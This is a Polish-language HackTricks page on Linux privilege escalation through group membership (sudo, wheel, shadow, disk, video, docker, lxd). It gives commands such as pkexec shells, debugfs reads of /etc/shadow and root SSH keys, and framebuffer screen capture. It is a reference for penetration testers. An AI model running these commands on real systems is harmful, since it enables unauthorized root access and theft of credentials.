{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społecznościowe na świecie.\
Uzyskaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Grupy Sudo/Admin

## **PE - Metoda 1**

**Czasami**, **domyślnie \(lub ponieważ niektóre oprogramowanie tego potrzebuje\)** w pliku **/etc/sudoers** możesz znaleźć niektóre z tych linii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik, który należy do grupy sudo lub admin, może wykonywać cokolwiek jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```text
sudo su
```
## PE - Metoda 2

Znajdź wszystkie binarki suid i sprawdź, czy istnieje binarka **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli stwierdzisz, że binarny plik pkexec jest binarnym plikiem SUID i należysz do sudo lub admin, prawdopodobnie będziesz mógł wykonywać binaria jako sudo za pomocą pkexec. Sprawdź zawartość:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Tam znajdziesz, które grupy mają prawo do wykonywania **pkexec** i **domyślnie** w niektórych systemach linux mogą **pojawić się** niektóre z grup **sudo lub admin**.

Aby **stać się rootem, możesz wykonać**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Jeśli spróbujesz wykonać **pkexec** i otrzymasz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś połączony bez GUI**. I jest obejście tego problemu tutaj: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji ssh**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Grupa Wheel

**Czasami**, **domyślnie** w pliku **/etc/sudoers** możesz znaleźć tę linię:
```text
%wheel	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik, który należy do grupy wheel, może wykonywać cokolwiek jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```text
sudo su
```
# Shadow Group

Użytkownicy z **grupy shadow** mogą **czytać** plik **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, przeczytaj plik i spróbuj **złamać niektóre hashe**.

# Grupa dysków

To uprawnienie jest prawie **równoważne dostępowi root** ponieważ możesz uzyskać dostęp do wszystkich danych wewnątrz maszyny.

Pliki: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Zauważ, że używając debugfs możesz również **zapisywać pliki**. Na przykład, aby skopiować `/tmp/asd1.txt` do `/tmp/asd2.txt`, możesz to zrobić:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jednakże, jeśli spróbujesz **zapisać pliki należące do roota** \(jak `/etc/shadow` lub `/etc/passwd`\) otrzymasz błąd "**Permission denied**".

# Grupa Wideo

Używając polecenia `w`, możesz znaleźć **kto jest zalogowany w systemie** i pokaże to wynik podobny do poniższego:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
The **tty1** oznacza, że użytkownik **yossi jest fizycznie zalogowany** do terminala na maszynie.

Grupa **video** ma dostęp do wyświetlania wyjścia ekranu. W zasadzie możesz obserwować ekrany. Aby to zrobić, musisz **złapać bieżący obraz na ekranie** w surowych danych i uzyskać rozdzielczość, którą używa ekran. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Aby **otworzyć** **surowy obraz**, możesz użyć **GIMP**, wybrać plik **`screen.raw`** i jako typ pliku wybrać **Dane surowego obrazu**:

![](../../.gitbook/assets/image%20%28208%29.png)

Następnie zmodyfikuj Szerokość i Wysokość na te używane na ekranie i sprawdź różne Typy obrazów \(i wybierz ten, który lepiej pokazuje ekran\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Grupa Root

Wygląda na to, że domyślnie **członkowie grupy root** mogą mieć dostęp do **modyfikacji** niektórych plików konfiguracyjnych **usług** lub niektórych plików **bibliotek** lub **innych interesujących rzeczy**, które mogą być użyte do eskalacji uprawnień...

**Sprawdź, które pliki członkowie root mogą modyfikować**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Grupa Docker

Możesz zamontować system plików root maszyny hosta do woluminu instancji, więc gdy instancja się uruchamia, natychmiast ładuje `chroot` do tego woluminu. To skutecznie daje ci uprawnienia root na maszynie.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Grupa lxc/lxd

[lxc - Eskalacja uprawnień](lxd-privilege-escalation.md)


<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społeczności.\
Uzyskaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>
{% endhint %}
